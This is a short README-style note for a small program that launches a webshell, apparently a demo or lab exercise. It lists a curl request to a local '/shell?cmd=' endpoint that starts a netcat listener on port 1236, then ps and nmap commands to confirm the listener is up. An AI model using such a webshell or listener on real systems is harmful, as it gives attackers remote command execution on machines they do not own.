A little program to launch a webshell.

* Start the application
* curl -X GET http://localhost:65100/shell?cmd=netcat%20-nlvp%201236
* ps aux | grep 'netcat -nlvp' **OR** nmap -p 1236 localhost 